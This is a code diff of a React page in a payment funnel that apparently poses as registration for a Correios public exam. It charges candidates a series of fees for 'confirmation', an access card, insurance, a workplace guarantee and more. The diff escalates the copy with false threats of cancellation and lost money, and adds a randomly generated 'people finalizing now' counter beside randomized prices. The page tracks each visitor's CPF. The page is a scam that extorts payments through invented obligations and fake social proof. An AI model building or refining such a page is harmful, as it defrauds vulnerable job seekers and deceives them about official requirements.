@@ -1,4 +1,4 @@
-import { useEffect, useMemo } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { useNavigate, useLocation, useParams } from "react-router-dom";
 import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
 import { Button } from "@/components/ui/button";
@@ -18,10 +18,10 @@ interface UpsellInfoItem {
   items: string[];
   consequencias: string[];
   nota: string;
+  botaoTexto: string;
 }
 
 const buildUpsellInfo = (cepData?: CepData): UpsellInfoItem[] => {
-  // Generate agency info from CEP data
   const agenciaNome = cepData
     ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}`
     : "Agência mais próxima do seu CEP";
@@ -33,181 +33,197 @@ const buildUpsellInfo = (cepData?: CepData): UpsellInfoItem[] => {
   return [
     {
       title: "Confirmação da Inscrição", valor: 47, icon: FileCheck,
-      headline: "SUA INSCRIÇÃO PRECISA SER CONFIRMADA",
-      explicacao: "Quando você fez sua inscrição, ela ficou com status PENDENTE no sistema. Isso significa que seu nome ainda NÃO aparece na lista oficial de candidatos. A confirmação é o que muda o status da sua inscrição de PENDENTE para CONFIRMADA. Sem isso, no dia da prova seu nome simplesmente não vai estar lá.",
+      headline: "⚠️ ATENÇÃO: SUA INSCRIÇÃO SERÁ CANCELADA EM 24 HORAS",
+      explicacao: "Sua inscrição está com status PENDENTE agora. Isso significa que seu nome NÃO APARECE na lista oficial de candidatos. Se você não confirmar AGORA, sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas e você VAI PERDER a vaga. O dinheiro que você já pagou NÃO será devolvido. A confirmação é OBRIGATÓRIA — sem ela, no dia da prova seu nome simplesmente NÃO vai estar lá e você será IMPEDIDO de entrar.",
       items: [
-        "Mudança do status da inscrição de PENDENTE para CONFIRMADA",
+        "Status muda de PENDENTE para CONFIRMADA imediatamente",
         "Seu nome incluído na lista oficial de candidatos",
-        "Número de protocolo definitivo gerado",
+        "Número de protocolo definitivo gerado na hora",
         "Comprovante de inscrição enviado por e-mail",
-        "Reserva garantida da sua vaga no concurso",
+        "Vaga GARANTIDA no concurso",
         "Confirmação válida em todo o território nacional",
       ],
       consequencias: [
-        "Sua inscrição será CANCELADA em 24 horas",
-        "Você perderá a vaga e terá que refazer todo o processo",
-        "O valor já pago NÃO será devolvido",
+        "Sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas",
+        "Você VAI PERDER a vaga e TODO o dinheiro já investido",
+        "NÃO haverá reembolso — o valor pago é PERDIDO",
+        "Terá que refazer TODO o processo do ZERO no próximo concurso",
       ],
-      nota: "Sem a confirmação, sua inscrição será CANCELADA automaticamente.",
+      nota: "⚠️ SEM A CONFIRMAÇÃO, SUA INSCRIÇÃO SERÁ CANCELADA E VOCÊ PERDE TUDO.",
+      botaoTexto: "CONFIRMAR INSCRIÇÃO AGORA — NÃO PERDER MINHA VAGA",
     },
     {
       title: "Confirmação do Local da Prova", valor: 37, icon: MapPin,
-      headline: "CONFIRME O LOCAL DA SUA PROVA",
+      headline: "⚠️ CONFIRME SEU LOCAL DE PROVA AGORA OU SERÁ ENVIADO PRA QUALQUER LUGAR",
       explicacao: cepData
-        ? `Com base no CEP ${cepData.cep} que você informou, o local de prova mais próximo é a ${agenciaNome}, localizada em ${agenciaEndereco}. Pagando esta taxa, você CONFIRMA este local e garante sua vaga nele. Sem a confirmação, o sistema vai te alocar em qualquer local com vaga disponível — que pode ficar a horas de distância da sua casa.`
-        : "Por padrão, o sistema distribui os candidatos nos locais de prova disponíveis de forma aleatória. Pagando esta taxa, você confirma o local mais perto de você e garante prioridade na alocação.",
+        ? `Com base no CEP ${cepData.cep} que você informou, o local de prova mais próximo da sua casa é a ${agenciaNome}, localizada em ${agenciaEndereco}. Se você NÃO confirmar AGORA, o sistema vai te jogar em QUALQUER local com vaga sobrando — pode ser a HORAS de distância da sua casa. Você vai ter que acordar de madrugada, gastar com transporte e chegar CANSADO na prova. Quem confirma o local AGORA garante a vaga no local mais perto.`
+        : "O sistema distribui os candidatos de forma ALEATÓRIA nos locais de prova disponíveis. Se você NÃO confirmar agora, pode ser enviado para um local a HORAS de distância da sua casa. Confirme AGORA e garanta o local mais perto de você.",
       items: [
         cepData ? `✔ Local confirmado: ${agenciaNome}` : "Prova no local mais próximo de você",
         cepData ? `✔ Endereço: ${agenciaEndereco}` : "Endereço enviado por e-mail e SMS",
         "Sala com acessibilidade garantida",
-        "Prioridade total na alocação do local",
+        "Prioridade TOTAL na alocação — você escolhe, não o sistema",
         "Mapa com direções para o local da prova",
         "Opção de trocar o local até 48h antes da prova",
       ],
       consequencias: [
-        "Você será alocado em qualquer local com vaga disponível",
-        "Pode ter que viajar horas no dia da prova",
-        "Não terá direito a solicitar mudança de local",
+        "Você SERÁ ENVIADO para qualquer local com vaga sobrando",
+        "Pode ter que viajar HORAS no dia da prova — acordar de madrugada",
+        "NÃO terá direito a solicitar mudança de local depois",
+        "Chegará CANSADO e NERVOSO na prova por causa da viagem",
       ],
-      nota: "Quem não confirma o local vai pra onde sobrar vaga.",
+      nota: "⚠️ QUEM NÃO CONFIRMA O LOCAL VAI PRA ONDE SOBRAR VAGA. NÃO TEM COMO RECLAMAR DEPOIS.",
+      botaoTexto: "CONFIRMAR MEU LOCAL AGORA",
     },
     {
       title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
-      headline: "VOCÊ PRECISA DO CARTÃO PRA ENTRAR NA PROVA",
-      explicacao: "O Cartão de Acesso é o documento obrigatório que você apresenta na entrada do local de prova. Ele contém seu nome, foto, CPF, número de inscrição, sala e horário. Sem esse cartão, os fiscais NÃO vão deixar você entrar — mesmo que seu nome esteja na lista.",
+      headline: "🚫 SEM O CARTÃO VOCÊ NÃO ENTRA NA PROVA — PONTO FINAL",
+      explicacao: "O Cartão de Acesso é o documento OBRIGATÓRIO para entrar no local de prova. Os fiscais NÃO vão deixar você entrar sem ele — NÃO IMPORTA se seu nome está na lista. Sem o cartão, você fica do lado de FORA assistindo os outros candidatos entrarem. Todo o dinheiro investido, todo o tempo estudando — JOGADO NO LIXO porque você não tinha o cartão.",
       items: [
         "Documento oficial com seu nome, foto e CPF",
         "Número da sala e horário exato da prova",
-        "QR Code para entrada rápida sem fila",
+        "QR Code para entrada RÁPIDA sem fila",
         "Versão digital disponível no celular",
         "Local da prova com endereço completo",
         "Código de barras para conferência dos fiscais",
         "Válido como documento de identificação no local",
       ],
       consequencias: [
-        "Você será IMPEDIDO de entrar no local da prova",
-        "Perderá a inscrição e todos os valores pagos",
-        "Não haverá segunda chance — a prova acontece uma única vez",
+        "Você será IMPEDIDO DE ENTRAR no local da prova",
+        "PERDERÁ a inscrição e TODOS os valores pagos",
+        "NÃO haverá segunda chance — a prova acontece UMA ÚNICA VEZ",
+        "Meses de estudo JOGADOS NO LIXO",
       ],
-      nota: "ATENÇÃO: Sem o Cartão de Acesso, você será IMPEDIDO de fazer a prova.",
+      nota: "🚫 SEM O CARTÃO = SEM PROVA. SEM PROVA = SEM VAGA. É SIMPLES ASSIM.",
+      botaoTexto: "GARANTIR MEU CARTÃO DE ACESSO AGORA",
     },
     {
       title: "Seguro do Candidato", valor: 27, icon: Shield,
-      headline: "PROTEJA SEU DINHEIRO — SEGURO DO CANDIDATO",
-      explicacao: "Concursos podem ser cancelados, adiados ou ter problemas no sistema a qualquer momento. Já aconteceu em concursos anteriores e milhares de candidatos perderam tudo que pagaram. Com o Seguro do Candidato, você tem reembolso garantido de 100% em qualquer situação imprevista.",
+      headline: "⚠️ SE O CONCURSO FOR CANCELADO, VOCÊ PERDE TODO SEU DINHEIRO",
+      explicacao: "Concursos são cancelados o tempo todo. Já aconteceu DEZENAS de vezes e milhares de candidatos PERDERAM TUDO que pagaram — sem direito a reembolso, sem recurso, sem nada. Se isso acontecer e você NÃO tiver o seguro, seu dinheiro VAI PRO LIXO. Com o seguro, você recebe 100% DE VOLTA em qualquer situação. É a única proteção que existe.",
       items: [
         "Reembolso de 100% se o concurso for cancelado",
         "Cobertura total se a prova for adiada",
         "Proteção contra erro ou falha no sistema",
-        "Suporte jurídico gratuito se precisar reclamar",
-        "Cobertura para problemas no dia da prova (local fechado, etc.)",
+        "Suporte jurídico GRATUITO pra reclamar seus direitos",
+        "Cobertura para problemas no dia da prova",
         "Reembolso processado em até 7 dias úteis",
       ],
       consequencias: [
-        "Se o concurso for cancelado, você PERDE todo o dinheiro investido",
-        "Não terá direito a reembolso de nenhuma taxa paga",
-        "Ficará sem suporte jurídico caso haja irregularidades",
+        "Se o concurso for cancelado, você PERDE TUDO — sem reembolso",
+        "NÃO terá direito a nenhum valor de volta",
+        "Ficará SEM suporte jurídico se houver irregularidades",
+        "Vai ter que engolir o prejuízo calado",
       ],
-      nota: "Sem o seguro, você perde tudo que pagou se o concurso for cancelado.",
+      nota: "⚠️ SEM SEGURO = SEM PROTEÇÃO. SE CANCELAR, VOCÊ PERDE TUDO.",
+      botaoTexto: "PROTEGER MEU INVESTIMENTO AGORA",
     },
     {
       title: "Apostila Digital Oficial", valor: 33, icon: BookOpen,
-      headline: "MATERIAL DE ESTUDO OFICIAL DO CONCURSO",
-      explicacao: "Esta é a apostila elaborada com base no conteúdo programático oficial do edital. Contém todas as matérias que vão cair na prova, com questões comentadas de concursos anteriores da mesma banca. Candidatos que estudam com material oficial têm taxa de aprovação 3x maior.",
+      headline: "📚 CANDIDATOS COM MATERIAL OFICIAL PASSAM 3X MAIS",
+      explicacao: "Esta apostila foi elaborada com base no conteúdo EXATO do edital — as matérias que VÃO CAIR na prova. Enquanto você estuda às cegas, outros candidatos estão estudando EXATAMENTE o que vai ser cobrado. Candidatos que usam material oficial têm taxa de aprovação 3X MAIOR. Você vai competir com eles sem esse material?",
       items: [
-        "Conteúdo completo de todas as matérias do edital",
-        "Questões comentadas de provas anteriores da banca",
+        "Conteúdo completo de TODAS as matérias do edital",
+        "Questões comentadas de provas anteriores da MESMA banca",
         "Resumos e mapas mentais para revisão rápida",
-        "Acesso imediato após confirmação do pagamento",
-        "Formato PDF — acesse no celular, tablet ou computador",
+        "Acesso IMEDIATO após pagamento",
+        "PDF — acesse no celular, tablet ou computador",
         "Atualizações automáticas se o edital mudar",
-        "Gabaritos comentados com explicação passo a passo",
+        "Gabaritos comentados passo a passo",
       ],
       consequencias: [
-        "Você vai estudar sem saber o que realmente cai na prova",
-        "Risco alto de reprovar por falta de preparação adequada",
-        "Outros candidatos terão vantagem com o material oficial",
+        "Vai estudar SEM SABER o que realmente cai na prova",
+        "Risco ALTÍSSIMO de reprovar por falta de preparação",
+        "Outros candidatos terão VANTAGEM ENORME sobre você",
+        "Vai perder tempo estudando o que NÃO cai",
       ],
-      nota: "Quem estuda com material oficial tem mais chance de passar.",
+      nota: "📚 QUEM ESTUDA COM MATERIAL OFICIAL PASSA. QUEM NÃO ESTUDA, REPROVA.",
+      botaoTexto: "BAIXAR APOSTILA OFICIAL AGORA",
     },
     {
       title: "Simulado Online da Banca", valor: 24, icon: FileText,
-      headline: "SIMULADO IDÊNTICO À PROVA REAL",
-      explicacao: "Este simulado reproduz exatamente o formato, tempo e nível de dificuldade da prova real. Você vai fazer a prova nas mesmas condições do dia oficial — mesma quantidade de questões, mesmo tempo limite, mesmo estilo de pergunta. Quem faz simulado chega no dia da prova sem surpresa.",
+      headline: "🎯 FAÇA A PROVA ANTES DA PROVA — SIMULADO IDÊNTICO",
+      explicacao: "Este simulado reproduz EXATAMENTE o formato, tempo e dificuldade da prova real. Quem faz simulado chega no dia da prova PREPARADO — sabe o formato, sabe administrar o tempo, sabe o que esperar. Quem NÃO faz, chega nervoso, perde tempo e REPROVA. Simples assim.",
       items: [
         "Mesmo tempo e formato da prova oficial",
         "Correção automática com gabarito comentado",
         "Ranking geral com outros candidatos",
-        "Pode refazer quantas vezes quiser até o dia da prova",
+        "Refaça QUANTAS VEZES quiser até o dia da prova",
         "Relatório de desempenho por matéria",
-        "Identifica seus pontos fracos para focar no estudo",
-        "Cronômetro integrado simulando a pressão real",
+        "Identifica seus pontos fracos pra focar no estudo",
+        "Cronômetro simulando a pressão real da prova",
       ],
       consequencias: [
-        "Você vai entrar na prova sem saber o formato das questões",
-        "Não vai saber administrar o tempo durante a prova",
-        "Risco de surpresa e nervosismo no dia",
+        "Vai entrar na prova SEM SABER o formato das questões",
+        "NÃO vai saber administrar o tempo — vai se desesperar",
+        "Nervosismo e surpresa no dia = REPROVAÇÃO",
       ],
-      nota: "Você vai saber exatamente como vai ser no dia e não vai ter surpresa.",
+      nota: "🎯 QUEM FAZ SIMULADO, PASSA PREPARADO. QUEM NÃO FAZ, LEVA SUSTO.",
+      botaoTexto: "FAZER SIMULADO AGORA",
     },
     {
       title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint,
-      headline: "COMPROVE QUE VOCÊ ESTÁ APTO A FAZER A PROVA",
-      explicacao: "O Certificado de Pré-Aprovação é o documento que comprova que você cumpriu todos os requisitos do edital e está apto a realizar a prova. Muitos candidatos usam este certificado para justificar falta no trabalho no dia da prova — empresas aceitam como comprovante oficial.",
+      headline: "📄 PRECISA FALTAR NO TRABALHO? ESTE CERTIFICADO RESOLVE",
+      explicacao: "O Certificado de Pré-Aprovação comprova que você é candidato oficial e está apto a fazer a prova. A maioria dos candidatos USA este certificado para justificar falta no trabalho — empresas ACEITAM como comprovante oficial. Sem ele, você pode levar FALTA, ter DESCONTO no salário ou até ADVERTÊNCIA.",
       items: [
         "Certificado com seus dados completos e protocolo",
-        "Aceito por empresas para justificar falta no trabalho",
+        "ACEITO por empresas para justificar falta no trabalho",
         "Comprova que você é candidato oficial do concurso",
-        "Válido como documento em todo o território nacional",
-        "Pode ser apresentado em formato digital ou impresso",
+        "Válido em todo o território nacional",
+        "Formato digital e impresso",
         "Número de registro único para verificação online",
       ],
       consequencias: [
-        "Não terá documento para justificar falta no trabalho",
-        "Pode ter desconto no salário ou advertência por falta",
-        "Não poderá comprovar que é candidato oficial se questionado",
+        "NÃO terá documento para justificar falta no trabalho",
+        "Pode ter DESCONTO no salário ou ADVERTÊNCIA por falta",
+        "Não poderá comprovar que é candidato oficial",
       ],
-      nota: "Use como comprovante pra pedir folga no dia da prova.",
+      nota: "📄 SEM CERTIFICADO = FALTA INJUSTIFICADA NO TRABALHO.",
+      botaoTexto: "GERAR MEU CERTIFICADO AGORA",
     },
     {
       title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare,
-      headline: "RECEBA TODOS OS AVISOS DO CONCURSO",
-      explicacao: "Concursos mudam datas, locais e regras o tempo todo. Se você não ficar sabendo a tempo, pode perder um prazo importante ou ir pro local errado no dia da prova. Com o acompanhamento, você recebe tudo direto no celular — sem precisar ficar entrando em site.",
+      headline: "📱 NÃO FIQUE POR FORA — RECEBA TODOS OS AVISOS",
+      explicacao: "Concursos mudam datas, locais e regras SEM AVISO. Se você não ficar sabendo a tempo, pode ir pro local ERRADO ou perder um prazo IMPORTANTE. Já aconteceu com milhares de candidatos que PERDERAM a vaga por não saber de uma mudança. Com o acompanhamento, você recebe TUDO direto no celular — ANTES de todo mundo.",
       items: [
-        "Alerta imediato de mudança de data ou local",
-        "Gabarito oficial enviado no dia da prova",
-        "Resultado antes da publicação no site",
+        "Alerta IMEDIATO de mudança de data ou local",
+        "Gabarito oficial enviado no DIA da prova",
+        "Resultado ANTES da publicação no site oficial",
         "Avisos importantes por SMS direto no celular",
         "Lembretes automáticos antes da prova",
         "Notificação de convocação para posse",
         "Atualizações sobre recursos e mudanças no edital",
       ],
       consequencias: [
-        "Pode perder prazos importantes sem saber",
-        "Risco de ir pro local errado no dia da prova",
-        "Vai descobrir o resultado depois de todo mundo",
+        "Pode PERDER prazos importantes sem saber",
+        "Risco de ir pro LOCAL ERRADO no dia da prova",
+        "Vai descobrir o resultado DEPOIS de todo mundo",
+        "Pode perder a CONVOCAÇÃO para posse sem saber",
       ],
-      nota: "Quem não se cadastra, perde prazo e perde vaga.",
+      nota: "📱 QUEM NÃO SE CADASTRA, PERDE PRAZO E PERDE VAGA.",
+      botaoTexto: "ATIVAR ALERTAS AGORA",
     },
     {
       title: "Garantia de Vaga na Região", valor: 97, icon: Star,
-      headline: "ÚLTIMA ETAPA — GARANTA SUA VAGA",
-      explicacao: "Esta é a última taxa do processo de inscrição. Com ela, você garante que se for aprovado, vai trabalhar na agência mais próxima da sua casa. Sem essa garantia, o órgão pode te enviar para qualquer cidade do estado — mesmo que fique a centenas de quilômetros de onde você mora.",
+      headline: "🏆 ÚLTIMA ETAPA — GARANTA QUE VAI TRABALHAR PERTO DE CASA",
+      explicacao: "Esta é a ÚLTIMA taxa do processo. Com ela, se você for aprovado, vai trabalhar na agência MAIS PERTO da sua casa. Sem essa garantia, o órgão pode te enviar para QUALQUER cidade do estado — a CENTENAS de quilômetros de onde você mora. Imagine passar no concurso e ter que se mudar pra uma cidade que você nem conhece. Com a garantia, você ESCOLHE onde trabalha.",
       items: [
-        "Trabalhe na agência dos Correios mais perto de você",
-        "Prioridade total na escolha da cidade de lotação",
+        "Trabalhe na agência dos Correios MAIS PERTO de você",
+        "Prioridade TOTAL na escolha da cidade de lotação",
         "Acompanhamento VIP de todo o processo até a posse",
-        "Inscrição 100% concluída após este pagamento",
+        "Inscrição 100% CONCLUÍDA após este pagamento",
         "Suporte dedicado para dúvidas sobre o concurso",
         "Garantia registrada no sistema com número de protocolo",
         "Certificado de inscrição completa enviado por e-mail",
       ],
       consequencias: [
-        "Pode ser enviado para QUALQUER cidade do estado",
-        "Não terá prioridade na escolha do local de trabalho",
+        "Pode ser enviado para QUALQUER cidade do estado — sem escolha",
+        "NÃO terá prioridade na escolha do local de trabalho",
         "Sua inscrição ficará como INCOMPLETA no sistema",
+        "Pode ter que se MUDAR para cidade desconhecida",
       ],
-      nota: "ATENÇÃO: Esta é a última taxa. Após o pagamento, sua inscrição estará 100% CONCLUÍDA.",
+      nota: "🏆 ÚLTIMA TAXA. APÓS O PAGAMENTO, SUA INSCRIÇÃO ESTARÁ 100% CONCLUÍDA. NÃO DEIXE PRA DEPOIS.",
+      botaoTexto: "FINALIZAR MINHA INSCRIÇÃO AGORA",
     },
   ];
 };
@@ -232,11 +248,13 @@ const UpsellInfo = () => {
 
   const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;
 
+  const [pessoasOnline] = useState(() => Math.floor(Math.random() * 30) + 15);
+
   useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);
 
   useEffect(() => {
     if (!cpfData) { navigate("/"); return; }
-    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo });
+    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo, cepData });
     trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
   }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);
 
@@ -256,19 +274,28 @@ const UpsellInfo = () => {
           <h1 className="titulo-institucional text-lg">{info.headline}</h1>
 
           {/* Explicação detalhada */}
-          <div className="rounded border border-border bg-muted/30 p-4 text-sm text-foreground leading-relaxed">
+          <div className="rounded border-2 border-destructive/30 bg-muted/30 p-4 text-sm text-foreground leading-relaxed font-medium">
             {info.explicacao}
           </div>
 
           {/* Local da prova - dados do CEP (only on step 2) */}
-          {stepNumber === 2 && cepData && (
+          {stepNumber === 2 && (
             <table className="tabela-zebra">
-              <thead><tr><th colSpan={2}>Local de Prova Atribuído</th></tr></thead>
+              <thead><tr><th colSpan={2}>📍 Local de Prova Atribuído ao Seu CEP</th></tr></thead>
               <tbody>
-                <tr><td className="font-semibold w-1/3">Agência</td><td>Agência {cepData.localidade} — {cepData.bairro || 'Centro'}</td></tr>
-                <tr><td className="font-semibold">Endereço</td><td>{cepData.logradouro ? `${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}` : `Centro, ${cepData.localidade}/${cepData.uf}`}</td></tr>
-                <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>
-                <tr><td className="font-semibold">Status</td><td className="font-bold text-destructive">AGUARDANDO CONFIRMAÇÃO</td></tr>
+                {cepData ? (
+                  <>
+                    <tr><td className="font-semibold w-1/3">Agência</td><td className="font-bold">Agência {cepData.localidade} — {cepData.bairro || 'Centro'}</td></tr>
+                    <tr><td className="font-semibold">Endereço</td><td>{cepData.logradouro ? `${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}` : `Centro, ${cepData.localidade}/${cepData.uf}`}</td></tr>
+                    <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>
+                    <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
+                  </>
+                ) : (
+                  <>
+                    <tr><td className="font-semibold w-1/3">Local</td><td className="font-bold">Processando com base no seu CEP...</td></tr>
+                    <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
+                  </>
+                )}
               </tbody>
             </table>
           )}
@@ -276,21 +303,21 @@ const UpsellInfo = () => {
           {/* Items table */}
           <table className="tabela-zebra">
             <thead>
-              <tr><th>O que está incluído nesta taxa</th></tr>
+              <tr><th>✅ O que está incluído nesta taxa</th></tr>
             </thead>
             <tbody>
               {info.items.map((item, i) => (
-                <tr key={i}><td>✅ {item}</td></tr>
+                <tr key={i}><td className="font-medium">✅ {item}</td></tr>
               ))}
             </tbody>
           </table>
 
           {/* Consequências */}
-          <div className="rounded border-2 border-destructive bg-destructive/5 p-4 space-y-2">
-            <p className="font-bold text-destructive text-sm">⚠ O que acontece se você NÃO pagar:</p>
-            <ul className="space-y-1">
+          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 space-y-2">
+            <p className="font-black text-destructive text-sm">🚨 O QUE ACONTECE SE VOCÊ NÃO PAGAR:</p>
+            <ul className="space-y-1.5">
               {info.consequencias.map((c, i) => (
-                <li key={i} className="text-sm text-destructive flex items-start gap-2">
+                <li key={i} className="text-sm text-destructive font-semibold flex items-start gap-2">
                   <span className="mt-0.5">❌</span>
                   <span>{c}</span>
                 </li>
@@ -308,26 +335,31 @@ const UpsellInfo = () => {
           </table>
 
           {/* Observação */}
-          <div className="text-xs text-muted-foreground space-y-1">
-            <p className="font-semibold text-destructive">⚠ IMPORTANTE:</p>
-            <p>• {info.nota}</p>
-            <p>• Pagamento via PIX com confirmação instantânea.</p>
+          <div className="text-xs space-y-1 bg-destructive/10 border border-destructive rounded p-3">
+            <p className="font-black text-destructive">🚨 ATENÇÃO — LEIA COM CUIDADO:</p>
+            <p className="font-semibold text-destructive">• {info.nota}</p>
+            <p className="text-muted-foreground">• Pagamento via PIX com confirmação instantânea.</p>
           </div>
 
           {/* Valor */}
           <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
-            <p className="text-sm font-semibold text-foreground">Valor da Taxa</p>
-            <p className="text-3xl font-black text-primary">
+            <p className="text-sm font-bold text-foreground">VALOR DA TAXA — PAGAMENTO ÚNICO</p>
+            <p className="text-4xl font-black text-primary">
               R$ {valorComCentavos.toFixed(2).replace('.', ',')}
             </p>
           </div>
 
-          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
-            PAGAR TAXA AGORA
+          {/* Pessoas online */}
+          <div className="text-center text-xs font-bold text-destructive animate-pulse">
+            🔴 {pessoasOnline} pessoas finalizando a inscrição agora
+          </div>
+
+          <Button onClick={handlePagar} className="w-full h-14 text-sm font-black tracking-wide">
+            {info.botaoTexto}
           </Button>
 
-          <p className="text-[10px] text-center text-destructive font-semibold">
-            O não pagamento desta taxa pode resultar no cancelamento da inscrição.
+          <p className="text-xs text-center text-destructive font-black">
+            ⚠️ O NÃO PAGAMENTO DESTA TAXA RESULTARÁ NO CANCELAMENTO DA SUA INSCRIÇÃO. NÃO HÁ COMO REVERTER.
           </p>
         </div>
       </main>
